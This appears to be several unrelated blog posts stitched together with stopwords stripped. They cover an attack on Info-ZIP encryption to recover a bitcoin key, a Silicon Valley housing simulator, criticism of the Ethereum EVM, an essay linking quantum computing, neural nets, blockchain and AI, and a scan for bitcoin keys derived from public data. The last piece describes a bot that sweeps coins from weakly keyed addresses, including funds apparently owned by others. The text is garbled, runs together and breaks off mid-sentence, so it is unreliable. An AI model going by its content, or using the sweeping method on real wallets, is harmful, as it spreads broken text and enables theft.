rand function would initialize state random number generator xoring timestamp process id generate ten byte per file left way knowing timestamp process id would enough information recover header byte turn would let mount biham kocher attack seems infozip author knew attack went one step encrypted header using password way attacker doublyencrypted plaintext attack work noticed password pass first stream byte pas like toggling light switch twice leaf started xoring byte twice stream byte leaf unaffected let mount powerful ciphertext attack given five encrypted file archive could derive internal

byte twice gave answer expecting guess fewer fewer bit key material went extra file also let exclude potential key material time took hour single desktop machine published paper got present japan fast software encryption left accessdata worked neural networking startup year spent three year master degree computer science university auckland cris calude started phd mathematical physicist john baez uc riverside worked google applied security team six year finished phd year ended cto startup six month ago received blue message linkedin russian guy read paper written year ago wanted know attack could work file two file quick analysis said without enormous amount processing power lot money two file work lot false positive would advance stage would end possible key test nearly sextillion estimated would take large gpu farm year break cost order astounded saying could spend much recover key back january bought around bitcoin put key encrypted zip file worth upwards remember password luckily still original laptop knew exactly encryption took place infozip seed entropy using timestamp promised reduce work made quite feasible matter couple month medium gpu farm made contract got

fourth byte knew complete state rest cipher convert four byte original done would run state space check one see gave proper high byte though quintillion key check test one would take hundred thousand year vaguely remembered work done cryptanalyzing tlcgs using lattice reduction dug original paper perfect needed define lattice basis vector given power constant tlcg lattice reduction given reduced basis could recover original state high byte matrix multiplication least idea would need five byte constrain single outcome point attack four process described paper rarely gave right answer however

work made variant previously popular simswe software engineer simulator wily engineer trying buy house commute work real estate marketplace modeled based silicon valley region nt live friend define lowdensity northern californian suburban area including sunnyvale mountain view cupertino etc excluding san francisco san francisco obviously relevant since lot engineer live sf commute silicon valley vice versa bit different left simplicity even earlier version simswe knew mechanic advance wanted visualize cool way learned lot making simulation software project tangible output expected kept debugging got expected stopped usual surprise along way simulation real science let clear maybe simulation real science sometimes friend really zen art motorcycle maintenance back high school book get le profound get older one favourite part commentary scientific method man conducting geewhiz science show fifty thousand dollar worth frankenstein equipment anything scientific know beforehand result effort going motorcycle mechanic hand honk horn see battery work informally conducting true scientific experiment testing hypothesis putting question nature formation hypothesis mysterious category scientific method come one know person sitting somewhere minding business suddenly flash understands something understand tested hypothesis truth test source source somewhere else process followed started observing price silicon valley unexpectedly high considering much suck live rising quickly maybe like weather california willing pay premium premium rising surprisingly quickly last year even weather stay mostly said hypothesis high price think caused price inelasticity specifically think software engineer make much money living california compared anywhere else would rational move dramatically overpay housing increase revenue exceed increase cost also hypothesized discontinuity market unlike say new york city price high tend gently fluctuate price silicon valley historically seem two state spiking eg dotcom bubble today strong market collapsing eg dotcom crash tried generate simulator would demonstrate effect cheating nt make simulator first principle see would happen made series buggy simulator discarded one nt show behaviour looking science look similar probably lot common phacking think useful use result wisely science part science approach method improved hypothesis formulation mysterious process described quote started think discontinuity vague made simulator hypothesis discontinuity point demand exceeds supply market pricing pattern look something like much appropriate reallife testing maybe something like theoretical physic versus experimental physic spend time trying fit formula data time trying design experiment get specific new data see guessed right except worse nt use real data experiment real science area way get done paper simulated particular housing market california compared actual market data cool nt help u explain going silicon valley simulator okay disclaimer way let talk find source code sort thing nt really recommend probably find bug since impossible simulation correct first place finding bug rather pointless anyway imagine region set swes software engineer corporate employer various home scattered around randomly luckily simulating suburban northern california public transit speak traffic congestion uniformly bad zoning restriction essentially new housing ever get built even assumption accurate building short flat set element boot time leave static change number people working amount company willing pay relative size different company exactly company employ given swe given time period year cause gravity shift around region engineer buy home near silicon graphic rip commute might get worse jump facebook may may decide time move home array autonomous agent income employer location commute cost property value accumulated net worth property tax also simulated idiotic california property tax payment nt change property change owner behaviour effect mainly discourage people exchanging equallypriced home move bit closer work nt want pay higher tax result marketdistorting law ironically serf increase commute time thus also congestion make citizen le happy nice work california hardest part simulator producing working real estate bidding system acted even halfway believably simulated swes real jerk repeatedly exploited every flaw market clearing mechanic leading kind completely unnatural looking result perversely fact result version finally seem sensible give confidence current iteration bidding system totally wrong trained logician could likely prove increased confidence precisely wrong logician human today result let see plot repeated x axis time let say month since start

directly dsr transition draw vertical red line three plot clarity also horizontal line second plot third plot liquidity show number simulated home market yet sold given moment market mean someone decided willing sell price still bid nobody made good enough offer yet like said part simulator really hard get right source look like line code see many line code die produce pricing wise turn quite essential mostly ca nt buy house nt market bidding nt always complete instantaneously deal transition answer question talk rational price pay house one flaw simulation simulated agent indeed rational pay whatever take long still make net profit real people nt like house sold last month asking million today often refuse pay price spite even though whole market moved house could argue rational wait see market drop back okay fine enough trouble simulating present simulating agent unrealistic opinion simulator going next seemed kinda unwieldy another convenient aspect silicon valley almost agent engineer numerous b rich outnumber overwhelm almost participant market find lot news article service industry worker insane commute completely priced region interest actually also lot longterm resident area simply refuse move complaining obnoxious techie infestation see home amazing investment vehicle keep going year economybeating percentage simulator ignore people effectively participating market make long story short agent assume increase income x dollar moving silicon valley v living elsewhere okay pay mortgage cost r x r order land highpaying job subtract amount pain suffering lost work hour daily commute proportionally length commute result housing near big employer expensive housing farther away good bidding process depends whether dsr le one fewer swes house one swes house le one people bid based lack better word value land home people wo nt overpay home buy another one street le price move slowly smoothly demand change slowly smoothly also random variation based luck like occasional employerrelated event layoff etc market liquidity pretty high home market ready buy someone pay right price buyer market let look dsr inelastic demand exceeds supply condition lot people need move soon possible start profiting huge wage ca nt nt enough home get desperate every month nt house forfeit least x net worth make angry move fast liquidity go essentially zero people pay asking price bidding war nt stop think make offer someone else buy first premium seller market happens price settle basically r x okay r x mortgage payment convert annuity back selling price simulator also throw variably sized payment depending net worth acquired employment previous real estate flipping swes gon na swe r x simulator nt unlike reality engineer make roughly amount income mean know variation much certainly le order magnitude right overpaid underpaid people majority closer median income note quite different housing market many kind job income distribution much wider people price sensitivity much greater simplification assume r x engineer mean simply matter much try pay r x home hand completely rational pay way r x demand exceeds supply nt pay r x someone else price peak level dsr dip back liquidity go price go back interestingly simulated price drop lot slower shot first place one reason people desperate sell buy hand people decide sell might popular location people forced buy home price might still bid property improve commute result increasing price variability people sell notsogreat location exchange stillrare great location mean first unlike healthier market say new york city increase demand translates higher price demand increase decrease smoothly improve property increase resale price silicon valley special three unusual characteristic demand strictly greater supply buyer share similar upper limit much pay limit buyer highly price insensitive mean example improving home unlikely increase resale value people already paying much hence phenomenon rundown home worth million ugly neighbourhood service culture public transit money could buy huge mansion elsewhere nice condo interesting neighbourhood big city mean raising engineer salary match higher cost living cost living adjustment pointless translates directly higher housing price x go everyone r x go proportionally eats benefit course salary continue rise silicon valley mostly due continually increasing competition employee housing hard import continue see rise property value expect proportional wage stock grant housing value demandsupply ratio turn mean slight increase housing supply effectively impact housing price unusual long demand exceeds supply engineer continue max price result though market price provides little indication much supply needed dsr simulation suggests price remain flat ignoring wage increase regardless change housing supply make hard decide much housing build market healthy see price drop bit rise slower new housing come market extrapolate see much housing appropriate point assume much housing needed much latter small amount added housing could drop u market dynamic would change discontinuously according simulation recall ca nt necessarily trust price would drop slowly would still drop lot would pop bubble unlike simulation engineer rational popping bubble could cause kind market panic adjacent effect way beyond area expertise turn mean nimby crazy try improve home neighbourhood region improve property value nt waste money municipal fund property value already maximum build housing run risk putting dsr sending property value free fall return normal healthy market condition course would best globally could get market back normal big tech company could hire people service industry worker could live closer work enjoy better life le grumpy market liquidity engineer could buy home want closer work instead whatever available mean could switch employer easily people would spend money improve property neighbourhood thus improving resale value making life enjoyable next buyer global optimization nt individual local optimization nimby popping bubble could legitimate personal financial disaster moreover nimby people get vote zoning construction rule improvement project think vote little housing possible obviously common sense would love able give advice certainly housing bubble bubble pop eventually ideally want pop bubble gently mean nt know asset deteriorates current price slowly leaf owner poor happened fast nt know possible hold price say instead pesky discontinuity

blockchain due gas cost mention effort porting real algorithm solidity however still private blockchains gas cost matter blockchain wo nt want part slow evm contract would use c go number real programming language implement cryptography native code precompiled smart contract really blow entire justification supporting bit integer water feel real foundation problem evm lot lurking le obvious area evm memory model evm main place put data stack temporary memory permanent memory stack certain limit sometimes need use temporary memory instead expensive permanent memory allocate instruction anything like evm claim memory writing may seem pretty clever also extremely sinister instance write address contract allocated ie bit word memory paid gas cost used memory well easy workaround track last memory address use increment need work decently unless happen need one point lot memory nt need memory anymore let say crazy algorithm us word memory allocate use memory whatever pay word memory exit function back function need word memory scratch space something allocates another word using word memory way free memory theory decrease special pointer keeping track last space memory work know entire block memory never referenced safely reused word need word word must copy another location like stack memory freed tool provided evm help technical term memory fragmentation vet function nt use memory allocated globally accessible reuse memory something got vetting process contract potentially critical state corruption bug option basically either open large class memory reuse bug pay gas memory even though already allocated need additionally allocating memory linear cost allocated word memory allocate word significantly expensive allocating word memory program start aspect greatly amplifies economic cost safe side compared opening contract bug greatly decreased gas cost use memory use stack well stack ridiculously limited evm stack evm stackbased machine mean us stack operation rather set register stack based machine typically much simpler optimize result opcodes needed operation compared similar register based machine anyway evm lot different operation operate stack alone notice swap dup series instruction go try compile contract pragma solidity contract something function foo address address address address address address address address address address address address address address address address address met error compilererror stack deep try removing local variable error occurs item level deep stack effectively impossible access without popping item stack official solution problem use le variable make function smaller various workarounds also include stuffing variable struct array using memory keyword nt able applied normal variable reason let fix contract use memory based structs pragma solidity contract something struct meh address x function foo address address address address address address address address address address address address address meh memory meh memory meh memory meh memory result compilererror stack deep try removing local variable replaced variable memory nt fix well instead storing bit integer stack storing integer bit memory address ie reference bit slot memory part solidity problem primary problem evm missing way access arbitrary item stack every vm implementation know work around basic problem either encouraging small stack size making easy swap stack item memory alternative storage like local variable net implementing pick instruction similar allows access arbitrary stack slot however evm stack free place memory data computation place direct cost form gas directly discourages small stack size anywhere else expensive arrive basic language implementation problem like bytecode size rationale document stated goal evm bytecode simple compact however like saying prefer write code descriptive concise fundamentally differing goal accomplished fundamentally different way simple instruction set accomplished limiting number operation keeping operation concise simplistic meanwhile compact bytecode produce small program accomplished making instruction set performs many operation possible byte code possible ultimately despite compact bytecode size goal rationale actual implementation evm attain goal sense instead focused simplistic instruction set easy create gas model around saying wrong bad one primary goal evm fundamentally end goal evm also one number given document c program take byte order implement hello world definitely case gloss different environment optimization take place c program c program measured expect also elf data relocation data alignment optimization aligning code data certain boundary byte measurable impact performance program physical processor personally built simplistic bare bone c program compiles byte machine code simple greeter type program compiles byte solidity example compiles byte evm bytecode understand need simplistic instruction set security reason cause significant bloat blockchain passing evm smart contract bytecode small possible detrimental could clearly made much smaller including standard library supporting opcodes batch common operation rather needing execute several opcodes thing bit integer really bit integer awful ridiculous part used place reasonable use effectively impossible use bit unit gas integer size used specifying counting gas bit course memory fairly expensive address size memory address evm bit course contract need word memory atom universe would complain using bit integer address value permanent storage actually provides interesting ability use hash data worry conflict address space guess get pas every single instance could use integer size evm call bit even jump us defense limit highest jump destination effectively limit jump destination signed bit integer currency value smallest unit eth wei arrive total coin supply wei estimate currently supply subtract number power maximum value storable bit integer get enough space send wei ever exist plus magnitude greater number atom universe basically bit integer incredibly impractical unnecessary almost application evm designed lack standard library ever developed solidity smart contract probably one first thing encountered problem standard library want determine two string equal strcmp memcmp anything like must write code copy code internet zepplin project making situation bearable providing standard library contract use either including contract calling external contract however limitation approach apparent considering cheaper use two operation compare resulting hash loop byte string byte time determine equal standard library precompiled contract use native code set reasonable gas price would greatly beneficial entire smart contract ecosystem without though people instead copy paste code open source code unknown security implication addition people optimize code trying find shortcut reduction gas usage even risk potentially compromising security profile contract economics game theory gas plan making full blog post topic evm nt make good practice hard also expensive instance cost quite bit gas store data blockchain mean incredibly expensive cache amount data within smart contract instead computed contract execution time gas consumed blockchain node waste time executing code compute data furthermore little actual cost data stored blockchain directly increase size blockchain either ethereum qtum real cost data enters blockchain form data sent contract directly increase size blockchain almost cheaper etheruem enter byte data blockchain form transaction gas cost store byte contract significantly cheaper scaling byte data gas tx compared gas storage virtual cost data stored contract much le people assume basically cost iterating database storing data entire blockchain rlp leveldb database system used qtum ethereum efficient handling however ongoing cost close linear another part evm encourages inefficient code possible call specific function smart contract security able directly call function like withdraw contract would bad however needed standard library efficient instead simply able load specific piece code external contract nothing execution always start first byte code way jump around skip solidity abi bootstrap code end encourages small function duplicated expensive call externally deploy many function contract possible cost difference calling byte contract byte contract despite code needing loaded memory either way finally possible access storage contract directly contract code must fully loaded disk executed code must load data storage requested finally return calling contract making sure use variable size array oh need back forth nt know exact data needed least cache cheap node discount gas price calling external contract second time possible access external contract storage without needing completely load code fact cheap computationally accessing current contract storage make expensive discourage efficiency lack debugging testability problem lie fault evm design also implementation course project striving make easy possible like truffle however evm design make easy exception available outofgas logging facility easy way call external native code test helper mocking data ethereum blockchain difficult create private testnet private blockchain different parameter behavior qtum least leg thanks regtest mode testing evm mock data etc still incredibly hard since implementation really standalone debugger know work solidity level least evm assembly debugger know though far user friendly symbol format debug data format established evm andor solidity found eips effort begin working toward standardized debug format like dwarf floating point number one common thing see people say lack floating point support come well one handling currency value using floating point number incredibly narrowminded though many practical use case floating point number risk modeling scientific computation case range approximation important exact value saying potential application smart contract handling currency value unrealistic needlessly limiting immutable code one major thing contract need designed upgradeability matter contract need changed rather evm code completely immutable us harvard architecture computing possible load code memory execute code data completely separate thing treated differently option upgrading contract deploy completely new contract duplicating code make old contract redirect patching

solid structure maintain stability robustness market bringing together,entirely fooling around happens take four today popular buzzword string together result mean anything given today april well easter sunday thought fun explore think easter something interesting might hatch make clear fooling around stringing buzzword together detail say perfectly real listen essay soundcloud really launch talking whole string buzzword let discus background buzzword quantum saying something quantum sound modern actually quantum mechanic century old course past century central understanding calculating lot thing physical science even century truly quantum technology arrived yes thing like laser mri atomic force microscope rely quantum phenomenon needed quantum mechanic order invented come practice engineering done still basically firmly classical nothing quantum today though lot talk quantum computing might change everything actually worked quantum computing back early yes recent idea say always bit skeptical whether could ever really whether quantum gain one might get would counterbalanced inefficiency measuring going case past year sort nice theoretical work formulating idea quantum circuit quantum computing lot thing done wolfram language including ongoing project produce definitive symbolic way representing quantum computation far ever calculate quantum computation wolfram language run ordinary classical computer company built say small true quantum computer actually hoping hook wolfram language implement quantumevaluate function far happened really vouch quantumevaluate big idea basically ordinary classical physic one pretty much say definite thing happen world billiard ball go direction particular case definite direction quantum mechanic though idea electron say intrinsically go particular definite direction instead essentially go possible direction particular amplitude insist measuring went get definite answer many measurement see probability go direction well quantum computing trying somehow make use possible direction idea order effect get lot computation done parallel tricky business type problem theory worked famous integer factoring yes according theory big quantum computer able factor big integer fast enough make today cryptography infrastructure implode thing anyone far even claim built along line tiny quantum definitely yet anything terribly interesting ok one critical aspect quantum mechanic interference different path say electron take mathematically similar interference happens light even water wave classical physic quantum mechanic though supposed something much intrinsic interference leading phenomenon entanglement one basically ever see wave interfering effect computing though making use kind interference yet least modern time always trying deal discrete typical phenomenon interference say light basically involves continuous number personal guess optical surely succeed delivering spectacular speedup truly quantum though though might marketed like technically minded complicated question computationtheoretic result apply continuous process like interferencebased computing neural decade ago computer systematic way tell whether picture elephant teacup past five year thanks neural network basically become easy interestingly image identifier made three year ago remains basically state art big idea well back people started thinking seriously brain like electrical machine led mathematical model neural network proved equivalent computational power mathematical model digital computer year followed billion actual digital electronic computer built along way people including experimented neural network nobody could get anything terribly interesting though year quietly used thing like optical character recognition starting lot people suddenly got excited seemed like neural net finally able interesting thing first especially connection image happened well neural net basically corresponds big mathematical function formed connecting together lot smaller function involving certain number parameter weight outset big function basically give random output way function set possible train neural net tuning parameter inside function give output one want like ordinary programming one explicitly defines step computer follow instead idea give example one want neural net expect interpolate work particular input practice one might show bunch image elephant bunch image teacup million little update parameter get network output elephant fed elephant teacup fed teacup crucial idea neural net somehow supposed generalize specific example supposed say anything like elephant example elephant even particular pixel quite different said another way lot image might fed network basin attraction elephant opposed teacup mechanical analogy one might say lot place water might fall landscape still ending flowing one lake rather another level sufficiently complicated neural net principle trained anything become clear lot practical task turn overlap rather well brain seem easily realistic feasible amount gpu time actually train neural network million element useful thing yes wolfram language got rather sophisticated symbolic framework training using neural lot automation us neural net everything blockchain word blockchain first used connection invention bitcoin course idea blockchain precursor simplest form blockchain like ledger successive entry coded way depends previous entry crucial making work concept hashing hashing always one favorite practical computation idea even independently came year old hashing take piece data like text string make number say million grinding data using complicated function always give result input almost always give different result different input function called hash wolfram language example applying previous paragraph text give ok relate blockchain well back people invented cryptographic hash actually related thing done computational irreducibility cryptographic hash feature easy work hash particular piece data hard find piece data generate given hash let say want prove created particular document particular time well could compute hash document publish newspaper believe bell lab actually used every week back anyone ever say document yet certain date say look hash already every copy newspaper idea blockchain one series block containing certain content together hash point data hash computed combination content block hash preceding block mean block effect confirms everything came blockchain cryptocurrencies like bitcoin big idea able validate transaction example able guarantee looking blockchain nobody spent bitcoin twice one know block added correctly hash computed etc well point whole decentralized network thousand computer around world store blockchain lot people well actually many practice day competing one add new block include transaction people submitted want rule le first person add block get keep fee offered transaction block get confirmed lot people including block copy blockchain continuing add blockchain block latest version wolfram language blockchainblockdata blockchainbase bitcoin give symbolic representation latest block seen added bitcoin blockchain time maybe block added pretty sure everyone satisfied block correct yes analogy measurement quantum mechanic talking soon traditionally people keep ledger say transaction one central place master ledger maintained blockchain whole thing distributed trust single entity keep ledger correct led idea cryptocurrencies like bitcoin flourish without central control government bank involved last couple year lot excitement generated people making large amount money speculating cryptocurrencies currency thing one use blockchains ethereum pioneered idea addition transaction one run arbitrary computation node right ethereum result computation confirmed run every single computer network incredibly inefficient bigger point computation running autonomously network computation interact defining smart contract run autonomously say happen different circumstance pretty much nontrivial smart contract eventually need know something world rain today package arrive etc come oracle happens yes result decade work wolfram knowledgebase power wolframalpha etc provides realistic foundation today making oracle ai back people thought pretty much anything human intelligence could soon possible make artificial machine intelligence better course turned much harder people expected fact whole concept creating artificial intelligence pretty much fell disrepute almost nobody wanting market system ai five year unexpected success neural changed ai back cooler ever ai supposed though well big picture see continuation long trend automating thing human previously particular computation make computation example ai well computation built whole scientific philosophical structure around something call principle computational equivalence basically say universe possible done simple full computation sophisticated one ever get certainly brain engineering building program though tremendous tendency try prevent anything sophisticated set thing system build follow exactly step foresee much computation fact spent much life building system make use wolframalpha great example goal take much knowledge world possible make computable able answer question expertly possible experientially feel like ai get ask question natural language like human computes answer often unexpected sophistication inside wolframalpha work anything like brain probably least leveraging last hundred year formalism civilization developed allow u much systematic brain naturally thing modern neural net example machine learning system wolfram language perhaps work little like brain practice really seems make thing seem like ai operating basis sophisticated computation whose behavior readily understand day way see computational universe amazing computational power issue able harness useful human purpose yes ai go sort computation sophisticated brain issue align thing care yes spent large part life building wolfram language whose purpose provide computational communication language human express want form suitable computation lot ai power computational universe challenge harness way useful u oh want kind computational smart contract define want ai behave eg nice human yes think wolfram language going right way express thing build ai constitution want common theme outset might seem quantum neural blockchain ai quite separate concept without lot commonality actually turn amazing common theme one strongest complexity generation fact different way thing talking rely complexity generation mean complexity generation one day explain probably still somehow find always showing alltime favorite science discovery rule automaton point even though rule program simple behavior system spontaneously generates complexity apparent randomness happens complicated enough show call computational irreducibility reduce computational work needed see behave essentially follow step find happen sort important phenomenon revolve around complexity generation computational irreducibility obvious fact sophisticated computation easy sense make something like ai possible ok relate blockchain well complexity generation make cryptographic hashing possible allows simple algorithm make enough apparent randomness successfully used cryptographic hash case something like bitcoin another connection protocol need people make investment able add block blockchain way achieved bizarrely enough forcing irreducible computation effectively cost computer time neural net well simplest neural net involve much complexity one drew basin attraction different input simple polygon useful neural net basin attraction much complicated obvious one get recurrent neural net happens training process neural net computational process effectively generates complexity way approximate thing like distinction elephant v teacup get made world alright quantum mechanic well quantum mechanic level full randomness essentially axiom traditional mathematical formalism quantum mechanic one compute probability way see randomness personally happen think pretty likely approximation one could get underneath thing like space time see randomness actually get generated even standard formalism quantum mechanic kind complementary place randomness complexity generation important somewhat mysterious process measurement let start talking another phenomenon physic second law thermodynamics law entropy increase law say start example bunch gas molecule orderly configuration say one corner box overwhelming probability soon randomize eg spread randomly box yes kind trend towards randomness something see time strange part look law say motion individual gas molecule completely say molecule randomize also say able unrandomize never see happen always bit mysterious think clear answer related complexity generation computational irreducibility point gas molecule randomize effectively encrypting initial condition given impossible place gas molecule unrandomize rather randomize work effectively requires breaking essence something much like involved bitcoin mining ok relate quantum mechanic well quantum mechanic fundamentally based probability amplitude interference different thing happen experience world definite thing happen bridge quantum mechanic involves rather boltedon idea quantum measurement notion little quantum effect electron end spin rather need get amplified point one really sure happened word one measuring device make sure little quantum effect associated one electron cascade spread across lot lot electron thing tricky part one want avoid interference possible really perceive something definite happened one need enough randomness thing somehow equally well go like thermodynamics even though pure quantum circuit one imago practical quantum computer typically sufficiently simple mathematical structure presumably intrinsically generate complexity process measuring inevitably must generate complexity yes reasonable question whether sense randomness one see really come different story reversibility irreversibility reversibility irreversibility strangely common theme least quantum neural blockchain one ignores measurement fundamental feature quantum mechanic reversible mean one take quantum system let evolve time whatever come one always least principle able take run backwards precisely reproduce one started typical computation reversible like consider gate might basic component computer p q result true either p q true knowing result true figure p q true word operation irreversible preserve enough information invert quantum circuit one us gate say take two input say p q give two output say p q two output one always uniquely reproduce two input ok let talk neural net neural net usually conceived fundamentally irreversible imagine make neural network distinguish elephant teacup make work large number different possible input image map say elephant like gate knowing result elephant unique way invert computation whole point one want anything enough like elephant picture one showed still come elephant word irreversibility central whole operation least kind neural net ok could one possibly make quantum neural net maybe possible going brain brain seem work much like neural net yet brain physical system presumably follow quantum mechanic brain possible level answer fact brain dissipate heat well heat microscopically heat random motion thing like molecule one way state second law thermodynamics law entropy increase normal circumstance random motion never spontaneously organize kind systematic motion principle molecule could start moving way turn flywheel practice nothing like ever happens heat stay heat spontaneously turn macroscopic mechanical motion ok let imagine microscopic process involving say collision molecule precisely fact according quantum mechanic point lot molecule involved motion get encrypted seem random one could look detail still enough information reverse everything practice one seems like whatever going system turned heat producing neural net behavior well point one part system say systematically deciding say elephant detailed information would needed go back initial state getting randomized turning heat fair though glossing quite bit fact think anyone know one actually set quantum system say quantum circuit behaves kind way pretty interesting potentially tell u lot quantum measurement process explain one go quantum mechanic everything amplitude experience world definite thing seem happen people sometimes end trying appeal mystical feature consciousness point quantum neural net quantum mechanical yet come definite conclusion eg elephant v teacup good toy model thing suspect one could create one quantum version cellular automaton show phase transition unlike detailed mechanic real quantum magnetic material necessary system enough component say spin heat needed compensate apparent irreversible behavior stay away part irreversible behavior observed let make perhaps slightly confusing side remark people talk quantum computer usually talking quantum circuit operate qubits quantum analog binary bit sometimes actually mean something different mean quantum annealing device imagine got bunch domino trying arrange plane matching condition associated marking always satisfied turn hard problem related computational irreducibility perhaps problem like integer factoring end find say configuration best satisfying matching condition everywhere one may effectively essentially try possible configuration see one work best well ok let imagine domino actually molecule matching condition corresponds arranging molecule minimize energy problem finding best overall configuration like problem finding minimum energy configuration molecule physically correspond stable solid structure formed molecule ok might hard compute actual physical system molecule actually one cool easy molecule get lowest energy configuration one nice crystalline solid people sometimes assume physic always figure even problem computationally hard molecule always find optimal solution think actually think instead happen material turn mushy quite liquid quite solid least long time still idea one set energy minimization problem quantum mechanically physical system successful finding lowest energy state yes quantum mechanic might harder get stuck local minimum tunneling etc confusing part one train neural net one end effectively solve minimization problem like one described value weight make network minimize error output relative one want people end sometimes talking quantum neural net meaning dominolike array set energy minimization problem mathematically equivalent one neural net yet another connection convolutional neural kind used example image structured much like cellular automaton like dynamic spin system training neural net handle multiscale feature image one seems end scale invariance similar one see critical point spin system quantum analog analyzed renormalization group method ok let return whole buzzword string blockchain well one big point blockchain sense irreversible possible something added blockchain one want inconceivable ever reversed achieved well curiously similar work thermodynamics quantum measurement imagine someone add block copy blockchain well idea lot people world make copy block blockchain node go independently adding block bad thing would happen lot people maintaining blockchain node decided collude add block modify etc bit like gas molecule degree freedom quantum measurement time everything spread among enough different component extremely unlikely concentrate together systematic effect course people might quite like gas molecule though frankly observed aggregate behavior eg jostling around crowd often strikingly similar sort thing world seem depend assumption randomness indeed probably necessary maintain stability robustness market trading happening ok blockchain try ensure definite history something similar quantum measurement close loop little let ask quantum blockchain might like yes one could imagine using quantum computing somehow break cryptography standard blockchain interesting view realistic possibility make actual operation blockchain quantum mechanical typical blockchain certain element arbitrariness block get added get proof work scheme used bitcoin currently also ethereum find add new block one search nonce number throw make hash come certain way always many possible nonce though one hard find typical strategy search randomly successively testing candidate one could imagine quantum version one effect searching parallel possible nonce result producing many possible blockchains certain quantum amplitude fill concept imagine example case computation done blockchain reversible quantum one achieved say quantum version ethereum virtual machine would one blockchain yes would interesting quantum system kind dynamic actually connect world one get data word one measurement act measurement would effect force blockchain pick definite history ok neural blockchain least today far common strategy neural net first train put work one train passively feeding fixed set example one train actively effect ask example want analogy people neural net also lifelong learning continually getting updated based experience neural net record experience well changing various internal weight way happens like happens blockchains science fiction sometimes talk direct braintobrain transfer memory neural net context might mean taking big block weight one neural net putting another yes work well transfer definite layer one network another say transfer information feature image worth picking try insert memory deep inside network different story way memory represented network depend whole history network like blockchain replace one block expect everything else work whole thing knitted sequence thing happen time thing memory neural net memory formed certain way subsequent memory built top one bringing together outset one might thought quantum neural blockchain mention ai much common current buzzword fact might sense incompatible seen actually sort connection sort fundamental phenomenon shared system based might quantum neural blockchain ai qnbai like let look piece single blockchain node bit like single brain definite memory sense whole blockchain network becomes robust interaction different blockchain node little like human society human knowledge develop let say got raw ai sort computation well big issue whether find way align thing human think want make alignment essentially communicate ai level abstraction transcends detail work effect symbolic language understand example ai translate detail operates inside ai may end using kind concept say distinguish one class image another question whether concept one human sense culturally understand word concept example word one whole widely understood story sense concept human find useful communication one used sort interaction different human concept become robust knitted thought pattern many interacting brain bit like data put blockchain becomes robust part collective blockchain memory interaction blockchain node ok something strange first seemed like qnbais would something completely exotic unfamiliar perhaps impossible somehow go feature start seem awfully actually awfully like u yup according physic know quantum neural net capture many core feature brain seem work least general somehow related individual societal memory ai well ai effect try capture aligned human goal intelligence computational also ok closest thing know qnbai well probably u maybe sound crazy mean string buzzword connect like well level perhaps obvious answer tend create study thing relevant u somehow revolve around u buzzword today thing somehow within scope think concept currently somehow connected must say chose buzzword idea connect tried work thing writing remarkable much connection found yes fittingly bizarre end somewhat bizarre journey seem case string plucked today buzzword universe landed close home maybe least

reddit user fitwear recently claimed stolen blockchaininfo wallet evidence bitcoin address generation code wild using private key easily discovered regular basis either intentional mistake wallet

coding error could also yet another piece malware however explain feel le likely case order fully understand work discovered please read background following bitcoin since first heard one thing fascinated ability someone create private key anything using ie passwordphrase course recommended way obtaining private key since think wordphrase someone else likelihood bitcoins stolen quite high secure private key generated randomly probability someone else able generate sequence random byte close highly improbable anyone ever given expected lifespan universe peer blockchain find people played chain sending small amount bitcoins address corresponding private key generated using example word entire usrdictwords file found unix system small amount sent site called brainwalletorg made easy convert phrase private key public address code still available github since removed internet try using phrase like find lack faith disturbing nt droids looking satoshi nakamoto input find address corresponding private key small amount sent transferred quite obvious meant found turn lot address keep looking easily find nothing new known bitcoin community always idea back mind try find nontrivial example discoverable private key something beyond wordphrase decided try hunt buried bitcoin treasure perhaps could find bitcoin intentionally hidden someone nt yet discovered first couple week june finally devoted time task honestly nt expect find much amazed ended discovering began writing program scan every block blockchain record every public address ever used note nt store address balance greather zero stored believe ended accidentally discovering million time nt big deal experiment follows description experiment led discover believe either scam really bad coding error experiment first experiment see anyone used block hash private key would actually nifty way compress byte head would remember block height maybe digit corresponding larger byte number would saved time chain result success found address amount bitcoin sent expected balance either owner taken back discovered someone else two example use blockchaininfo see hex value actually block hash early chain happened onoff nothing really alarming far experiment similar first experiment searched address generated merkle root used private key btw searched compresseduncompressed key byte resulted two address lookup database result yes found address even though every address found balance expected fun success example similar merkle root block hash transaction id hash also seem used private key still nothing alarming thus far experiment wondered point anyone might used repeated word stop one iteration easily one million also becomes le likely discovered iteration found bunch sender x receiver x hello x hello x password x one favorite someone birth year people obviously burying bitcoin chain whether expected coin taken never know method still highly discoverable opinion experiment last experiment one led believe someone siphoning bitcoin service regular basis since take look private key public address raw byte private key look like look random enough however byte actually public address discovered performing public address collected setup experiment seeing address generated private key ever used bingo lot coming searched fraction chain found dozen also found address bitcoin sent recently within weeksdays discovered asked would someone first thought someone thought could get away remember one piece information rather two maybe one favorite addressprivate key combo derived another one thought possible could keep chain derive many wanted ever remember first one ruled one simple reason bitcoins transferred address transferred within minute second someone generated private key would coin almost immediately transferred every case looked complete list end doc every case looked coin moved away within minute second much likely bot waiting coin show also transaction still happening day address bot know advance address receive bitcoins scam mistake point formed theory really happening likely someone installed malicious code backend system mining pool exchange possibly wallet generation code using public information discover private key easily steal coin side would use publicaddress publicaddress super hard guess random sequence use hardcoded address well theory ca nt hardcoded would look suspicious source code repository likely code introduced someone work worked company connected bitcoin exchangemining poolgambling sitewallet code submitted developer source control system usually go code review process would much easier hide innocent looking operation inside million line code make backend used place bitcoin would nt look suspicious function would readily available however code submitted performed address would look suspicious guess someone slipped routine look harmless actually diverting bitcoin awaiting bot ready gobble actually quite clever one know destination address advance would keep performing public address ever used catch one million transaction someone would able capture coin simply watching transaction address corresponds private key generated one existing public address keeping database trivial lookup quick fair suppose could coding error anything possible buffer overflow would love see code ever found transaction still happening right couple week made discovery wrote bot try catch transaction mind blown within first hour bot going live jun whopping btc transferred address private key approximately worth usd time shocked address private key whose raw byte derived appears random address previously used chain failed test program sufficiently failed submit transaction btc sitting almost minute swept away someone else honestly nt think first amount cross radar would high sample found past transaction tiny amount quite possible whoever moved later poisoned address actually owned maybe someone else sweeper bot take small amount time avoid attention point pretty confident something yet discovered anyone else could taken btc known others also look history account btc transferred right away one month earlier one claimed theft knowledge involving address fixed program actually tested properly time let run program detected transaction within next hour coded bot ignore anything le btc nt move nt want tip anyone knew indeed case another day passed next hit bot detected roughly btc reason transferred immediately like rest time july weekend let one sit took full day moved may legitimate owner bot never know destination address private key raw byte plot thickens nt realize time last transfer address private key generated another public address like first one instead address generated transaction id forgotten seeded database private key generated transaction id part one earlier experiment nt label nt know pub address transaction id found hit time checked balance account zero nt think anything database detecting ongoing 